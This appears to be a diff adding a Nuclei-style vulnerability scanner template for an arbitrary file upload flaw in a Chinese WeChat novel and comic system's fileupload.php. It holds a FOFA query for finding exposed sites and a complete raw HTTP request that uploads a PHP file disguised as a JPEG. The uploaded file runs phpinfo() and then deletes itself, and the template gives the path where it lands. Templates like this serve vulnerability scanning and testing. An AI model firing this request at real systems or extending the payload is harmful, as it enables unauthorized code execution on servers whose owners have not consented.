@@ -1,0 +1,40 @@
+id: poc-awmpc25uv3l8aarl
+info:
+  name: 微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/awmpc25uv3l8aarl'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: awmpc25uv3l8aarl
+    fofa: body="/Public/home/mhjs/jquery.js"
+http:
+- raw:
+  - 'POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    Content-Disposition: form-data; name="file"; filename="info.php"
+
+    Content-Type: image/jpeg
+
+    <?php phpinfo();unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+
+    上传定位：/Public/webuploader/0.1.5/server/upload/info.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
